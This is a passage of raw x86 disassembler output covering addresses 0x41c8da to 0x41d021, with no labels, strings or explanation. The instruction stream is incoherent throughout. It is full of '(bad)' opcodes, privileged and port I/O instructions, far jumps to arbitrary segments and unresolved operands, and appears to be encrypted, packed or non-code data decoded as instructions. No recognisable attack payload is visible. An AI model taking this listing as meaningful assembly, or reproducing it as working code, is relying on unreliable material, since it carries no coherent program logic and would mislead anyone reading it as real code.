  41c8da:	push   0x94753e2b
  41c8df:	cmp    ebp,DWORD PTR [eax-0x6a]
  41c8e2:	je     0x41c8d0
  41c8e4:	xchg   ebp,eax
  41c8e5:	je     0x41c895
  41c8e7:	bound  ebx,QWORD PTR [eax-0x71]
  41c8ea:	rcl    BYTE PTR [edi+0x33c5e128],1
  41c8f0:	push   cs
  41c8f1:	iret   
  41c8f2:	cmp    BYTE PTR [edx],0x85
  41c8f5:	sbb    ebx,DWORD PTR [edi+0xd]
  41c8f8:	jecxz  0x41c8d6
  41c8fa:	aam    0xe1
  41c8fc:	out    dx,eax
  41c8fd:	push   es
  41c8fe:	dec    ebx
  41c8ff:	and    eax,0xd1bda691
  41c904:	cmp    al,0x41
  41c906:	xchg   ebx,eax
  41c907:	cmp    BYTE PTR [esi+0x6c0a7258],dl
  41c90d:	sub    al,BYTE PTR [ebp+0xeb087b0]
  41c913:	pop    eax
  41c914:	mov    bl,BYTE PTR ds:0x3ac09643
  41c91a:	in     eax,dx
  41c91b:	imul   ebx,ecx,0x99052f9d
  41c921:	cmp    eax,0x69de2c65
  41c926:	icebp  
  41c927:	arpl   WORD PTR [eax+eax*8],sp
  41c92a:	adc    edi,esp
  41c92c:	call   esi
  41c92e:	adc    cl,bh
  41c930:	cli    
  41c931:	(bad)  
  41c932:	jg     0x41c989
  41c934:	iret   
  41c935:	xor    DWORD PTR [esi-0x5f],0x3a
  41c939:	vmulsd xmm7,xmm7,QWORD PTR [edx]
  41c93d:	push   eax
  41c93e:	lahf   
  41c93f:	fwait
  41c940:	imul   edx,eax,0xffffffff
  41c943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c944:	or     DWORD PTR [esi],edi
  41c946:	xor    esp,eax
  41c948:	mov    fs,WORD PTR ds:[ebp-0x1ed9459b]
  41c94f:	xchg   edx,eax
  41c950:	cli    
  41c951:	mov    edi,0x99623ed5
  41c956:	dec    edi
  41c957:	dec    ebx
  41c958:	lea    eax,[ebx+esi*2-0xd]
  41c95c:	out    0x9,al
  41c95e:	data16 add dl,BYTE PTR [ebx]
  41c961:	popf   
  41c962:	jnp    0x41c950
  41c964:	int3   
  41c965:	sbb    DWORD PTR [esi+0x685ea72],eax
  41c96b:	div    BYTE PTR [eax+esi*1-0x61652171]
  41c972:	aaa    
  41c973:	jge    0x41c963
  41c975:	push   edx
  41c976:	jp     0x41c950
  41c978:	pop    ss
  41c979:	mov    dl,0xb
  41c97b:	in     eax,dx
  41c97c:	xchg   ecx,eax
  41c97d:	add    al,0x65
  41c97f:	ja     0x41c981
  41c981:	mov    ecx,0xe9d820d8
  41c986:	test   BYTE PTR [ecx+edi*4],cl
  41c989:	jmp    0x2b:0xc1300a87
  41c990:	test   BYTE PTR [esi+0x29112b0f],dl
  41c996:	inc    ecx
  41c997:	(bad)  
  41c998:	adc    dl,BYTE PTR [ebp-0x25]
  41c99b:	mov    ch,0x1
  41c99d:	ins    BYTE PTR es:[edi],dx
  41c99e:	or     BYTE PTR [ecx-0x7f],ah
  41c9a1:	in     al,dx
  41c9a2:	sahf   
  41c9a3:	jg     0x41c994
  41c9a5:	push   ds
  41c9a6:	xchg   BYTE PTR [ecx+eiz*1+0x13],ah
  41c9aa:	lock mov ds:0xf73be437,al
  41c9b0:	dec    edx
  41c9b1:	cmp    eax,0x20c870cd
  41c9b6:	in     al,0x22
  41c9b8:	cwde   
  41c9b9:	aad    0x61
  41c9bb:	pop    edx
  41c9bc:	pop    es
  41c9bd:	call   0x7b4633d2
  41c9c2:	out    0xa6,al
  41c9c4:	sub    al,0xc8
  41c9c6:	ins    DWORD PTR es:[edi],dx
  41c9c7:	mov    ah,0x88
  41c9c9:	xor    BYTE PTR [ebp-0x6d],dl
  41c9cc:	ficomp DWORD PTR es:[ebx+0x58]
  41c9d0:	jp     0x41ca09
  41c9d2:	dec    esp
  41c9d3:	push   0x7f
  41c9d5:	jmp    0x2971bc2b
  41c9da:	(bad)  
  41c9db:	in     eax,dx
  41c9dc:	js     0x41ca44
  41c9de:	nop
  41c9df:	ins    BYTE PTR es:[edi],dx
  41c9e0:	jae    0x41ca34
  41c9e2:	(bad)  
  41c9e3:	sahf   
  41c9e4:	call   0x8c0d:0xda753754
  41c9eb:	test   eax,0x66db9159
  41c9f0:	adc    al,0x79
  41c9f2:	test   BYTE PTR [edi+0x1e71920a],bl
  41c9f8:	lea    eax,[ebx-0x56]
  41c9fb:	loop   0x41c9ef
  41c9fd:	mov    dh,0xa1
  41c9ff:	adc    cl,ah
  41ca01:	adc    BYTE PTR es:[eax+esi*1],cl
  41ca05:	sti    
  41ca06:	pop    esi
  41ca07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca08:	sbb    edi,DWORD PTR [ebx-0x432bc26c]
  41ca0e:	jb     0x41ca33
  41ca10:	cmp    BYTE PTR [edi-0x2abc86c1],bl
  41ca16:	xchg   edx,eax
  41ca17:	inc    ecx
  41ca18:	inc    eax
  41ca19:	sub    ah,BYTE PTR [ecx+0x74527a49]
  41ca1f:	cmp    BYTE PTR [esi-0x3f999153],bl
  41ca25:	int3   
  41ca26:	jo     0x41ca47
  41ca28:	iret   
  41ca29:	or     eax,0x40e4d38
  41ca2e:	rcr    BYTE PTR [edi-0x18],cl
  41ca31:	jbe    0x41ca1b
  41ca33:	sti    
  41ca34:	xlat   BYTE PTR ds:[ebx]
  41ca35:	inc    edx
  41ca36:	add    eax,ebp
  41ca38:	lods   eax,DWORD PTR ds:[esi]
  41ca39:	and    ebp,ebp
  41ca3b:	push   cs
  41ca3c:	ret    0xf44a
  41ca3f:	mov    ebx,0x8dbc17c
  41ca44:	xchg   dl,al
  41ca46:	mov    BYTE PTR [eax],ah
  41ca48:	xchg   ebx,eax
  41ca49:	push   edx
  41ca4a:	xchg   ecx,eax
  41ca4b:	jne    0x41ca60
  41ca4d:	out    0xd4,eax
  41ca4f:	jb     0x41cabb
  41ca51:	xor    eax,0x56f098c4
  41ca56:	fs xchg edi,eax
  41ca58:	add    DWORD PTR [edx+0x74e9035c],ebp
  41ca5e:	sub    al,0xcb
  41ca60:	lds    esp,FWORD PTR [edx]
  41ca62:	in     eax,dx
  41ca63:	jge    0x41caaa
  41ca65:	mov    es,WORD PTR [ebx-0x49624916]
  41ca6b:	lds    eax,FWORD PTR [esi-0x7733e104]
  41ca71:	cmp    DWORD PTR [ebx-0x6c0a5915],ecx
  41ca77:	push   edx
  41ca78:	test   al,0xbe
  41ca7a:	sub    DWORD PTR [ebx-0x44],0x617f003b
  41ca81:	mov    eax,0xee8cd86c
  41ca86:	adc    al,0x66
  41ca88:	jno    0x41ca18
  41ca8a:	adc    eax,0x7e3cdad7
  41ca8f:	mov    esi,0x74bcb09a
  41ca94:	into   
  41ca95:	dec    ebx
  41ca96:	hlt    
  41ca97:	push   ecx
  41ca98:	mov    edi,0x5a79f9fd
  41ca9d:	cmp    DWORD PTR [ecx+0x4],eax
  41caa0:	add    al,0xd0
  41caa2:	popa   
  41caa3:	xchg   ebx,eax
  41caa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caa5:	out    0x23,al
  41caa7:	mov    ds:0xe90f4f42,al
  41caac:	xor    BYTE PTR [esi-0x6b],bl
  41caaf:	adc    DWORD PTR [edi+edx*2+0x67a06b7f],esi
  41cab6:	and    al,BYTE PTR [edi]
  41cab8:	pop    DWORD PTR es:0x93ff0dbd
  41cabf:	xchg   ebp,eax
  41cac0:	bound  edi,QWORD PTR [ebx]
  41cac2:	jne    0x41cafc
  41cac4:	inc    eax
  41cac5:	mov    dl,BYTE PTR [ebx]
  41cac7:	mov    cl,bh
  41cac9:	cmc    
  41caca:	push   ss
  41cacb:	adc    DWORD PTR [ecx-0x17],ebp
  41cace:	aas    
  41cacf:	mov    eax,ebp
  41cad1:	adc    eax,0xb1f63813
  41cad6:	xchg   ebx,eax
  41cad7:	dec    esp
  41cad8:	sti    
  41cad9:	jmp    0xff2a:0x575553d6
  41cae0:	sub    eax,0x8d17e81a
  41cae5:	clc    
  41cae6:	das    
  41cae7:	push   ebp
  41cae8:	inc    esp
  41cae9:	mov    ah,BYTE PTR [ecx]
  41caeb:	das    
  41caec:	and    DWORD PTR [ebx],edx
  41caee:	sub    al,0x40
  41caf0:	push   edx
  41caf1:	bound  edi,QWORD PTR [edi]
  41caf3:	push   ebp
  41caf5:	xchg   BYTE PTR [esi-0x4f],ch
  41caf8:	or     al,0xf2
  41cafa:	xor    eax,0x72cf6d33
  41caff:	sti    
  41cb00:	ins    DWORD PTR es:[edi],dx
  41cb01:	fiadd  DWORD PTR [ebx-0x36]
  41cb04:	test   al,0x43
  41cb06:	jg     0x41cb71
  41cb08:	jl     0x41caf2
  41cb0a:	int3   
  41cb0b:	jae    0x41cb63
  41cb0d:	imul   ebp,DWORD PTR [ecx],0x634f2e5e
  41cb13:	inc    esp
  41cb14:	push   ebp
  41cb15:	mov    ebx,0x8fae88cd
  41cb1a:	mov    dh,0xf6
  41cb1c:	mov    bh,0x65
  41cb1e:	add    BYTE PTR [esi-0x72],cl
  41cb21:	lock jnp 0x41caf0
  41cb24:	das    
  41cb25:	push   edx
  41cb26:	fwait
  41cb27:	ja     0x41cad4
  41cb29:	lahf   
  41cb2a:	inc    ecx
  41cb2b:	jbe    0x41cb35
  41cb2d:	and    edx,esp
  41cb2f:	adc    BYTE PTR [edx+0x7cf2d1f9],bh
  41cb35:	test   DWORD PTR [edx],esi
  41cb37:	xor    al,0x8d
  41cb39:	emms   
  41cb3b:	adc    BYTE PTR [eax+0x5a],bl
  41cb3e:	mov    bh,0x37
  41cb40:	adc    ah,BYTE PTR [ecx-0x1e93d577]
  41cb46:	cwde   
  41cb47:	xor    al,0x7b
  41cb49:	shl    BYTE PTR [ebx+0x158e9d7b],1
  41cb4f:	pop    eax
  41cb50:	mov    ah,0xc7
  41cb52:	lods   al,BYTE PTR ds:[esi]
  41cb53:	or     edi,DWORD PTR [ebx]
  41cb55:	jecxz  0x41cb49
  41cb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb58:	push   edx
  41cb59:	push   0x36a3b564
  41cb5e:	not    BYTE PTR ds:[ebx-0x24]
  41cb62:	add    bl,BYTE PTR [edi]
  41cb64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb65:	dec    esp
  41cb66:	sub    ah,bl
  41cb68:	pop    esi
  41cb69:	jbe    0x41cb7a
  41cb6b:	jb     0x41cb86
  41cb6d:	xchg   esi,eax
  41cb6e:	aam    0x80
  41cb70:	mov    cl,0x1f
  41cb72:	pop    eax
  41cb73:	mov    ah,BYTE PTR [edi]
  41cb75:	cld    
  41cb76:	sbb    DWORD PTR [edi],ebx
  41cb78:	mov    eax,ds:0xd87cf49b
  41cb7d:	stc    
  41cb7e:	xchg   BYTE PTR [edi-0x20],ah
  41cb81:	add    al,0x9
  41cb83:	sub    al,0xa7
  41cb85:	mov    ebx,0xf9714b0f
  41cb8a:	add    BYTE PTR [esp+esi*8-0xada1b8b],bh
  41cb91:	les    ebp,FWORD PTR [edx-0x30fb0214]
  41cb97:	jne    0x41cb64
  41cb99:	leave  
  41cb9a:	je     0x41cc0b
  41cb9c:	jo     0x41cb4c
  41cb9e:	mov    ecx,0x74a76c4
  41cba3:	outs   dx,BYTE PTR ds:[esi]
  41cba4:	jne    0x41cbfe
  41cba6:	push   edx
  41cba7:	repnz pusha 
  41cba9:	fiadd  DWORD PTR ds:0x42f51954
  41cbaf:	rcl    DWORD PTR [ecx-0x4fa6fc43],cl
  41cbb5:	xor    BYTE PTR [esi],ch
  41cbb7:	lea    esp,[ebx-0x54]
  41cbba:	arpl   WORD PTR [eax+0x3d],bp
  41cbbd:	dec    DWORD PTR [edi+0x39]
  41cbc0:	and    eax,0x985c4d2f
  41cbc5:	or     BYTE PTR [esp+eiz*4],ah
  41cbc8:	in     al,dx
  41cbc9:	jns    0x41cbda
  41cbcb:	dec    edi
  41cbcc:	cli    
  41cbcd:	mov    edi,0xe67e1996
  41cbd2:	mov    bh,0x14
  41cbd4:	test   BYTE PTR [ecx+ecx*8+0x18],0x4b
  41cbd9:	out    0xf,eax
  41cbdb:	jne    0x41cc29
  41cbdd:	int3   
  41cbde:	or     DWORD PTR [ebp+0x641fe930],0xffffffe2
  41cbe5:	cmp    al,0x76
  41cbe7:	in     al,0xb
  41cbe9:	pop    edi
  41cbea:	mov    ecx,0x613ca1d0
  41cbef:	dec    esi
  41cbf0:	icebp  
  41cbf1:	jne    0x41cc35
  41cbf3:	xchg   edi,eax
  41cbf4:	mov    ds:0xe3709f92,eax
  41cbf9:	pushf  
  41cbfa:	test   al,0xfa
  41cbfc:	or     DWORD PTR [esi],eax
  41cbfe:	jecxz  0x41cbc6
  41cc00:	int    0x4f
  41cc02:	mov    ch,0x92
  41cc04:	inc    esp
  41cc05:	gs xchg ebp,eax
  41cc07:	ds jmp 0x8ce7:0x3fcb3a52
  41cc0f:	jbe    0x41cc87
  41cc11:	lock dec esi
  41cc13:	rcr    BYTE PTR [edi+0x31],cl
  41cc16:	leave  
  41cc17:	rcl    DWORD PTR [eax+ebx*1-0x600c3d15],1
  41cc1e:	mov    ebx,0xce22644d
  41cc23:	aaa    
  41cc24:	add    edx,ebp
  41cc26:	mov    ebx,0x694920e0
  41cc2b:	mov    edx,0x98f13f3b
  41cc30:	lea    ebx,[edx+0x4e]
  41cc33:	(bad)  [esi+edi*4+0x630b9d29]
  41cc3a:	mov    eax,ds:0x4b534da5
  41cc3f:	stos   BYTE PTR es:[edi],al
  41cc40:	and    dh,bl
  41cc42:	push   eax
  41cc43:	jnp    0x41cc28
  41cc45:	xchg   ebx,eax
  41cc46:	inc    esp
  41cc47:	fcomp  QWORD PTR [ebp-0x2b]
  41cc4a:	fimul  WORD PTR [ebx-0x1643ea38]
  41cc50:	add    ebp,DWORD PTR [eax-0x38]
  41cc53:	rcr    al,1
  41cc55:	mov    bh,0x79
  41cc57:	shl    DWORD PTR [edx+0x1],cl
  41cc5a:	mov    ecx,?
  41cc5c:	xchg   esp,eax
  41cc5d:	js     0x41cbf9
  41cc5f:	xor    eax,0x22648d03
  41cc64:	or     ebp,0xffffffb4
  41cc67:	fst    DWORD PTR [esi+0x38]
  41cc6a:	cmc    
  41cc6b:	sub    BYTE PTR [edi-0x172ea94d],bl
  41cc71:	enter  0xebb3,0x40
  41cc75:	dec    esi
  41cc76:	or     DWORD PTR ds:0xc9599038,0x536d7d94
  41cc80:	jle    0x41ccaf
  41cc82:	lods   al,BYTE PTR ds:[esi]
  41cc83:	inc    ebp
  41cc84:	loopne 0x41cc83
  41cc86:	jno    0x41cca0
  41cc88:	push   eax
  41cc89:	cmp    al,0x45
  41cc8b:	lods   al,BYTE PTR ds:[esi]
  41cc8c:	pop    esi
  41cc8d:	and    edx,DWORD PTR [ecx+0x79]
  41cc90:	add    esi,edx
  41cc92:	push   cs
  41cc93:	xchg   DWORD PTR [esi+0x5717790d],ebp
  41cc99:	mov    dl,0x9a
  41cc9b:	mov    edi,0xf67ac6ee
  41cca0:	mov    ch,0x5
  41cca2:	imul   BYTE PTR cs:[edx]
  41cca5:	aaa    
  41cca6:	int3   
  41cca7:	test   BYTE PTR ds:0xd6c08c18,ch
  41ccad:	aaa    
  41ccae:	pushf  
  41ccaf:	adc    DWORD PTR [esi-0x6f],edx
  41ccb2:	mov    eax,ds:0x7a7e0196
  41ccb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccb8:	fdiv   QWORD PTR [edx+0x57ce584a]
  41ccbe:	lods   eax,DWORD PTR ds:[esi]
  41ccbf:	sbb    bl,BYTE PTR [esp+edi*1-0x4d]
  41ccc3:	or     al,0x29
  41ccc5:	inc    ebp
  41ccc6:	cmp    dh,cl
  41ccc8:	xchg   ecx,edi
  41ccca:	(bad)  
  41cccb:	mov    ch,0x11
  41cccd:	in     al,0xad
  41cccf:	sub    eax,0x367f7cdd
  41ccd4:	jbe    0x41cd3d
  41ccd6:	es push ebx
  41ccd8:	xchg   DWORD PTR [esp+ebp*8-0x24de5da5],eax
  41ccdf:	popf   
  41cce0:	xchg   ebx,eax
  41cce1:	(bad)
  41cce5:	rol    DWORD PTR fs:[edi+0x36],0x14
  41ccea:	std    
  41cceb:	(bad)  
  41ccec:	jo     0x41cd54
  41ccee:	das    
  41ccef:	push   ebx
  41ccf0:	loop   0x41cd38
  41ccf2:	lea    ebx,[esp+ebp*2]
  41ccf5:	test   eax,0xadb0ec52
  41ccfa:	sub    esi,DWORD PTR [edx-0xd]
  41ccfd:	icebp  
  41ccfe:	in     eax,0x62
  41cd00:	cmp    cl,BYTE PTR [edi+0x74db8a43]
  41cd06:	mov    fs,WORD PTR [ebp+0x67]
  41cd09:	sbb    DWORD PTR [esi+0x28],esi
  41cd0c:	(bad)  
  41cd0e:	mov    esi,ebp
  41cd10:	repnz add DWORD PTR [edx],ebp
  41cd13:	jg     0x41cd2f
  41cd15:	cs scas al,BYTE PTR es:[edi]
  41cd17:	jg     0x41cd7d
  41cd19:	sub    BYTE PTR [eax],ah
  41cd1b:	fild   DWORD PTR [eax+0x1539dcd2]
  41cd21:	mov    edx,0xc64eb0da
  41cd26:	mov    bh,0x83
  41cd28:	jp     0x41cd6d
  41cd2a:	jno    0x41cda9
  41cd2c:	push   ebp
  41cd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd2e:	adc    eax,0xde08c714
  41cd33:	add    al,0xad
  41cd35:	retf   0x862
  41cd38:	or     eax,0x2af0ecde
  41cd3d:	pushf  
  41cd3e:	nop
  41cd3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd40:	sub    al,BYTE PTR [edx]
  41cd42:	push   esi
  41cd43:	cmc    
  41cd44:	jnp    0x41cd32
  41cd46:	daa    
  41cd47:	stos   BYTE PTR es:[edi],al
  41cd48:	xor    DWORD PTR ds:0xec44edd8,0xffffffe3
  41cd4f:	in     eax,0x5d
  41cd51:	or     DWORD PTR [ecx],esp
  41cd53:	adc    ebp,DWORD PTR [ebp+0x39]
  41cd56:	jnp    0x41cd71
  41cd58:	xchg   esp,eax
  41cd59:	rol    BYTE PTR [edx-0x7],1
  41cd5c:	(bad)  
  41cd5d:	addr16 push edx
  41cd5f:	jae    0x41cd21
  41cd61:	mov    esp,0x30f58be1
  41cd66:	cli    
  41cd67:	icebp  
  41cd68:	sbb    ebp,DWORD PTR [edx+ebx*1-0x4b]
  41cd6c:	mov    esp,0xb2e49b58
  41cd71:	cmp    bl,dh
  41cd73:	fisttp WORD PTR [esi+ecx*1-0x1c59f768]
  41cd7a:	push   ebx
  41cd7b:	pop    ss
  41cd7c:	cli    
  41cd7d:	mov    ch,0x8f
  41cd7f:	sti    
  41cd80:	icebp  
  41cd81:	sbb    dh,BYTE PTR [eax+0x33]
  41cd84:	imul   DWORD PTR [ebp+0x26b58e89]
  41cd8a:	xor    eax,0xdd581292
  41cd8f:	cmp    esi,DWORD PTR [esi+edx*2]
  41cd92:	pop    es
  41cd93:	out    dx,eax
  41cd94:	mov    edi,es
  41cd96:	xor    BYTE PTR [edx-0x67],0x38
  41cd9a:	jle    0x41cd34
  41cd9c:	mov    edi,0x5660bb74
  41cda1:	es int 0x6d
  41cda4:	es es sub edx,eax
  41cda8:	dec    ecx
  41cda9:	daa    
  41cdaa:	push   edi
  41cdab:	mov    al,ds:0x3ab0334c
  41cdb0:	jmp    0x5000:0x9033142d
  41cdb7:	cmc    
  41cdb8:	and    cl,BYTE PTR [esi-0x54]
  41cdbb:	lock repz std 
  41cdbe:	in     al,0x5d
  41cdc0:	in     al,0xd8
  41cdc2:	sti    
  41cdc3:	jno    0x41cd7b
  41cdc5:	dec    esp
  41cdc6:	sub    BYTE PTR [eax],dh
  41cdc8:	int3   
  41cdc9:	fdivr  QWORD PTR [edi-0x660437c]
  41cdcf:	jns    0x41ce28
  41cdd1:	push   ebx
  41cdd2:	mov    esp,eax
  41cdd4:	pop    edx
  41cdd5:	fdiv   QWORD PTR [edi]
  41cdd7:	(bad)  [ecx+0x5f]
  41cdda:	pop    ecx
  41cddb:	pop    esi
  41cddc:	adc    cl,BYTE PTR [ebp-0x33977889]
  41cde2:	cli    
  41cde3:	jp     0x41ce40
  41cde5:	adc    ah,BYTE PTR [edx]
  41cde7:	cmp    cl,ch
  41cde9:	gs pop edi
  41cdeb:	fisubr DWORD PTR [ebp+ecx*2+0x42]
  41cdef:	or     DWORD PTR [ecx-0x7d212bbd],esi
  41cdf5:	xor    ah,BYTE PTR [esi]
  41cdf7:	sahf   
  41cdf8:	mov    dl,BYTE PTR [edi+ecx*2+0x3b91afe3]
  41cdff:	retf   0xfe7a
  41ce02:	popa   
  41ce03:	cmp    ebx,DWORD PTR [esi+0x6cdbb881]
  41ce09:	ss test eax,0xacd6471a
  41ce0f:	hlt    
  41ce10:	mov    dl,bh
  41ce12:	mov    ds:0x1e57301e,al
  41ce17:	cmp    edx,DWORD PTR [edx]
  41ce19:	pop    edx
  41ce1a:	js     0x41cdf5
  41ce1c:	pop    ecx
  41ce1d:	mov    edi,0x4942651
  41ce22:	sbb    eax,0xc6a02a31
  41ce27:	inc    esp
  41ce28:	or     al,0x97
  41ce2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce2b:	popa   
  41ce2c:	xor    bl,BYTE PTR ds:0xb964d0dc
  41ce32:	in     al,0x52
  41ce34:	mov    al,0xe2
  41ce36:	lock fstp QWORD PTR [eax-0x5c]
  41ce3a:	in     eax,0x41
  41ce3c:	pop    ss
  41ce3d:	fldcw  WORD PTR [ebx]
  41ce3f:	in     eax,dx
  41ce40:	popa   
  41ce41:	xchg   edi,eax
  41ce42:	arpl   si,sp
  41ce44:	iret   
  41ce45:	xlat   BYTE PTR ds:[ebx]
  41ce46:	mov    ecx,0xb9012a71
  41ce4b:	add    al,0xb0
  41ce4d:	sbb    al,0x48
  41ce4f:	jmp    0x9057f27b
  41ce54:	pop    esp
  41ce55:	data16 sbb al,0x67
  41ce58:	js     0x41cea6
  41ce5a:	inc    edx
  41ce5b:	neg    BYTE PTR [eax-0x6b416a40]
  41ce61:	add    eax,0x457dbaeb
  41ce66:	sbb    bh,BYTE PTR [ebx-0x39]
  41ce69:	jmp    0x9d5d5f9b
  41ce6e:	out    dx,eax
  41ce6f:	xlat   BYTE PTR ds:[ebx]
  41ce70:	xchg   esp,eax
  41ce71:	mov    ds:0x4af4a0a1,al
  41ce76:	xchg   esi,eax
  41ce77:	aaa    
  41ce78:	xchg   esi,eax
  41ce79:	lock mov ds:0xece0671d,al
  41ce7f:	(bad)  
  41ce80:	sub    ebp,DWORD PTR [esi]
  41ce82:	mov    ebx,0xc955a793
  41ce87:	adc    eax,DWORD PTR [esi]
  41ce89:	cs jg  0x41ce70
  41ce8c:	jo     0x41ce15
  41ce8e:	lods   eax,DWORD PTR ds:[esi]
  41ce8f:	mov    ch,0xd2
  41ce91:	mov    bh,0x8f
  41ce93:	pop    ds
  41ce94:	add    bh,BYTE PTR [edi-0x73]
  41ce97:	sbb    edx,0xf
  41ce9a:	add    al,dh
  41ce9c:	stos   DWORD PTR es:[edi],eax
  41ce9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce9e:	pop    ebp
  41ce9f:	add    DWORD PTR [edx-0x13798f31],0x21
  41cea6:	cli    
  41cea7:	lods   eax,DWORD PTR ds:[esi]
  41cea8:	nop
  41cea9:	and    al,0xa6
  41ceab:	mov    ebx,?
  41cead:	inc    esi
  41ceae:	mov    bl,0x2c
  41ceb0:	(bad)  
  41ceb1:	clc    
  41ceb2:	sbb    ecx,DWORD PTR [edx-0x71]
  41ceb5:	out    0x85,eax
  41ceb7:	ror    DWORD PTR [esi+eiz*8],cl
  41ceba:	dec    edx
  41cebb:	sbb    edi,edi
  41cebd:	gs pop ss
  41cebf:	or     dh,cl
  41cec1:	stos   DWORD PTR es:[edi],eax
  41cec2:	inc    esp
  41cec3:	ret    0x5a6
  41cec6:	jmp    0xe9fd1477
  41cecb:	in     eax,dx
  41cecc:	push   edi
  41cecd:	mov    edx,DWORD PTR [edx-0x6]
  41ced0:	mov    edx,edi
  41ced2:	fisubr DWORD PTR [eax-0x24]
  41ced5:	mov    ds:0x97f20685,al
  41ceda:	xchg   BYTE PTR [esi-0x4],ah
  41cedd:	mov    ds:0x9da962b3,eax
  41cee2:	sub    ecx,DWORD PTR [ebx+0x67]
  41cee5:	fcomp  DWORD PTR [ebx+0x435f11d]
  41ceeb:	cdq    
  41ceec:	ja     0x41ce7f
  41ceee:	inc    ecx
  41ceef:	adc    DWORD PTR [edx+0x3b],ebx
  41cef2:	push   esp
  41cef3:	int3   
  41cef4:	inc    esp
  41cef5:	in     al,0x23
  41cef7:	jb     0x41cef7
  41cef9:	push   esp
  41cefa:	ss adc eax,0x76c4954b
  41cf00:	lods   eax,DWORD PTR ds:[esi]
  41cf01:	stos   BYTE PTR es:[edi],al
  41cf02:	pushf  
  41cf03:	dec    ebp
  41cf04:	mov    dh,cl
  41cf06:	mov    eax,0x2eb5b202
  41cf0b:	repnz xchg edi,eax
  41cf0d:	add    BYTE PTR [edi+0x55cfb45e],dl
  41cf13:	adc    al,0x75
  41cf15:	adc    ah,BYTE PTR [edx]
  41cf17:	fstp   DWORD PTR [edi+0x43]
  41cf1a:	out    dx,al
  41cf1b:	lods   eax,DWORD PTR ds:[esi]
  41cf1c:	push   esp
  41cf1d:	jne    0x41cf02
  41cf1f:	outs   dx,BYTE PTR ds:[esi]
  41cf20:	adc    al,0xa4
  41cf22:	cmp    al,0x9
  41cf24:	mov    ss,WORD PTR [eax-0x64]
  41cf27:	retf   
  41cf28:	in     eax,0x36
  41cf2a:	sub    BYTE PTR [edi-0x41],0x29
  41cf2e:	push   ebx
  41cf2f:	or     edx,ecx
  41cf31:	imul   esp,DWORD PTR [edi+0x69],0xffffff94
  41cf35:	xor    dh,cl
  41cf37:	inc    esp
  41cf38:	push   0xffffffd3
  41cf3a:	stos   BYTE PTR es:[edi],al
  41cf3b:	add    eax,0x70c6d2bf
  41cf40:	xchg   DWORD PTR [edx+0x58c4cf56],esp
  41cf46:	lea    edx,[edx-0x5d]
  41cf49:	mov    eax,ds:0xc44d680a
  41cf4e:	jns    0x41cf20
  41cf50:	jmp    0xe984:0x6af6ff51
  41cf57:	push   eax
  41cf58:	enter  0x113d,0xba
  41cf5c:	inc    eax
  41cf5d:	nop
  41cf5e:	cmp    ebx,ecx
  41cf60:	mov    ds:0xe0672b92,al
  41cf65:	sub    esp,edx
  41cf67:	push   ss
  41cf68:	sub    esp,edi
  41cf6a:	cdq    
  41cf6b:	ins    DWORD PTR es:[edi],dx
  41cf6c:	inc    edx
  41cf6d:	mov    al,0xa2
  41cf6f:	fmul   QWORD PTR [ecx-0x1bffa7f8]
  41cf75:	xchg   ecx,eax
  41cf76:	push   edi
  41cf77:	mov    ah,0x85
  41cf79:	xchg   ebx,esi
  41cf7b:	sub    ebp,DWORD PTR [edi-0x54]
  41cf7e:	dec    esp
  41cf7f:	push   ds
  41cf80:	ins    BYTE PTR es:[edi],dx
  41cf81:	adc    ecx,DWORD PTR [edi]
  41cf83:	jg     0x41cfcf
  41cf85:	jle    0x41cf61
  41cf87:	cmp    eax,0x36ed2d16
  41cf8c:	rcr    DWORD PTR [edx+ebx*1],1
  41cf8f:	(bad)
  41cf92:	mov    ebx,0xb23a457
  41cf97:	or     al,0x1a
  41cf99:	sub    eax,0x45d39b70
  41cf9e:	mov    BYTE PTR [eax-0x47],bl
  41cfa1:	rol    DWORD PTR [eax+0x174f6d2b],1
  41cfa7:	out    0x36,eax
  41cfa9:	out    dx,eax
  41cfaa:	ins    DWORD PTR es:[edi],dx
  41cfab:	int3   
  41cfac:	std    
  41cfad:	mov    ch,0x50
  41cfaf:	sub    bh,ah
  41cfb1:	ret    0xdc92
  41cfb4:	shl    eax,cl
  41cfb6:	sti    
  41cfb7:	fwait
  41cfb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfb9:	cmp    esp,ebp
  41cfbb:	call   0xa40d788b
  41cfc0:	in     al,0x66
  41cfc2:	arpl   WORD PTR [esi-0xef5c914],dx
  41cfc8:	ins    BYTE PTR es:[edi],dx
  41cfc9:	jmp    0xa9dca361
  41cfce:	daa    
  41cfcf:	leave  
  41cfd0:	mov    bl,0x70
  41cfd2:	retf   0x2fa0
  41cfd5:	out    dx,al
  41cfd6:	(bad)
  41cfd9:	(bad)  
  41cfda:	sub    esp,DWORD PTR [edi-0x27290c7a]
  41cfe0:	jecxz  0x41d012
  41cfe2:	shl    ah,1
  41cfe4:	cmc    
  41cfe5:	push   ss
  41cfe6:	in     al,dx
  41cfe7:	dec    ebp
  41cfe8:	neg    bh
  41cfea:	jno    0x41cfab
  41cfec:	push   cs
  41cfed:	or     ebx,edx
  41cfef:	jae    0x41cf85
  41cff1:	jno    0x41cfc8
  41cff3:	jge    0x41d003
  41cff5:	fisub  WORD PTR [edx+0x2b7abde2]
  41cffb:	xchg   esi,eax
  41cffc:	rcr    ch,1
  41cffe:	push   cs
  41cfff:	test   DWORD PTR [ebx],0x8e8ffba9
  41d005:	add    eax,0xe5ec7649
  41d00a:	outs   dx,BYTE PTR ds:[esi]
  41d00b:	push   esi
  41d00c:	jno    0x41cffa
  41d00e:	jne    0x41d082
  41d010:	inc    ebp
  41d011:	cmp    al,0xf8
  41d013:	imul   edx,edx,0x4e
  41d016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d017:	or     BYTE PTR [ebp+ebx*2+0x37],al
  41d01b:	lds    edx,FWORD PTR [edx-0x79ee722c]
  41d021:	dec    edx
